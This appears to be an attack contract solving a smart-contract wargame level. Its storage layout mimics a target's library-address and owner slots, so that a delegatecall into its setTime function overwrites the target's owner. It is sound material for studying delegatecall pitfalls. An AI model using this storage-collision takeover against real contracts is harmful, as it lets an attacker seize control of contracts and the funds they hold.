// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract PreservationCaller {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    fallback() external payable {
        uint256 data = msg.value;
        owner = address(uint160(data));
    }

    function setTime(
        uint256 /*_time*/
    )
        public
    {
        owner = msg.sender;
    }
}
